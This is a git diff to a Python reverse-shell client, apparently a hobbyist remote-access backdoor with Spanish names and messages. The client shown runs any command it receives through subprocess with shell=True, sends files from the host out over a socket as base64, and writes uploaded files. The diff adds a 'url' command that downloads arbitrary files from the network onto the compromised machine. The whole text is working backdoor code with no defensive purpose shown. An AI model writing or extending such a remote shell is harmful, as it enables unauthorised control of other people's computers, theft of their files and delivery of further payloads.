@@ -5,7 +5,14 @@ import socket
 import os
 import subprocess
 import base64
+import requests
 
+def donwload_file(url):
+    consulta = requests.get(url)
+    name_file = url.split("/")[-1]
+    with open(name_file, 'wb') as file_get:
+        file_get.write(consulta.content)
+        
 def shell():
     current_dir = os.getcwd()
     cliente.send(current_dir)
@@ -17,13 +24,22 @@ def shell():
             os.chdir(res[3:])
             result = os.getcwd()
             cliente.send(result)
+
         elif res[:8] == "download":
             with open(res[9:], 'rb') as file_download:
                 cliente.send(base64.b64encode(file_download.read()))
+
         elif res[:6] == "upload":
             with open(res[7:], 'wb') as file_upload:
                 datos = cliente.recv(300000)
                 file_upload.write(base64.b64decode(datos))
+
+        elif res[:3] == "url":
+            try:
+                donwload_file(res[4:])
+                cliente.send("Archivo descargado Correctamente :)")
+            except:
+                cliente.send("Ocurrio un error en la descarga :( )")        
         else:
             proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
